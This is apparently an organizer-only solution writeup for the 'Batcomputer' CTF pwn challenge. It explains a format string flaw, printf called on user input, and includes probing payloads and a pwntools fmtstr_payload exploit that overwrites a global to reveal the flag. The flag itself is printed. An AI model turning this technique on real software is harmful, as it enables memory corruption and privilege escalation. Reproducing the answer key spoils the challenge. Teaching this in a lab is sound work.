# Batcomputer CTF Challenge - Solution Writeup

> **ORGANIZER ONLY - DO NOT DISTRIBUTE TO PLAYERS**

```
  ██████╗  █████╗ ████████╗ ██████╗ ██████╗ ███╗   ███╗██████╗ ██╗   ██╗████████╗███████╗██████╗ 
  ██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██╔═══██╗████╗ ████║██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗
  ██████╔╝███████║   ██║   ██║     ██║   ██║██╔████╔██║██████╔╝██║   ██║   ██║   █████╗  ██████╔╝
  ██╔══██╗██╔══██║   ██║   ██║     ██║   ██║██║╚██╔╝██║██╔═══╝ ██║   ██║   ██║   ██╔══╝  ██╔══██╗
  ██████╔╝██║  ██║   ██║   ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║     ╚██████╔╝   ██║   ███████╗██║  ██║
  ╚═════╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝      ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
```

---

## Challenge Overview

| Property | Value |
|----------|-------|
| **Name** | Batcomputer |
| **Category** | PWN |
| **Difficulty** | Easy-Intermediate |
| **Vulnerability** | Format String |
| **Architecture** | x86_64, No PIE, No Canary |
| **Flag** | `GTH{D4RK_KN1GHT_F0RM4T_STR1NG_VULN}` |

---

## Vulnerability Analysis

### Location
The vulnerability is in the `log_security_event()` function:

```c
printf(event_log);  // User input passed directly to printf
```

### Exploitation Goal
- Overwrite the global variable `access_level` (at address shown by option 2)
- Target value: `0x0BADC0DE` (the `required_level`)
- Once overwritten, option 3 reveals the flag

---

## Step-by-Step Solution

### 1. Identify the Vulnerability

Test with format specifiers in the logging function:
```
[GCPD-LOG] Event description: %p.%p.%p.%p.%p.%p
[LOGGED] 0x1.0x7f...0x0.0x0.0x...
```

### 2. Find the Stack Offset

Use a marker pattern to find where input appears:
```
[GCPD-LOG] Event description: AAAABBBB%6$p
[LOGGED] AAAABBBB0x4242424241414141
```

Our input is at **offset 6**.

### 3. Get Target Address

Select option 2 to check access level:
```
[SYSTEM] Current access level: 0x00000000
[SYSTEM] Required level:       0x0badc0de
[SYSTEM] access_level address: 0x404100
```

### 4. Craft the Exploit

Using pwntools:
```python
from pwn import *

target_addr = 0x404100  # From option 2 output
target_value = 0x0BADC0DE

payload = fmtstr_payload(6, {target_addr: target_value})
```

### 5. Get the Flag

After sending the payload, select option 3:
```
[VERIFIED] Biometric scan complete. Welcome, Batman.
│  FLAG: GTH{D4RK_KN1GHT_F0RM4T_STR1NG_VULN}  │
```

---

## Quick Solve

```bash
python3 exploit.py REMOTE challenge.gotham-ctf.com 9001
```

---

## Tools Required

- pwntools (`pip install pwntools`)
- Basic understanding of format string attacks

---

## Expected Player Approach

1. Explore the binary, notice option 1 logs input
2. Test for format string with `%x` or `%p`
3. Discover they can read/write memory
4. Notice option 2 gives them the target address
5. Use `%n` to write `0x0BADC0DE` to `access_level`
6. Access option 3 to get the flag

---

## Difficulty Justification

- **Easy aspects:** Address is given, No PIE, No Canary
- **Intermediate aspects:** Need to understand format string writes, calculate correct values

Perfect for beginners learning format string exploitation.
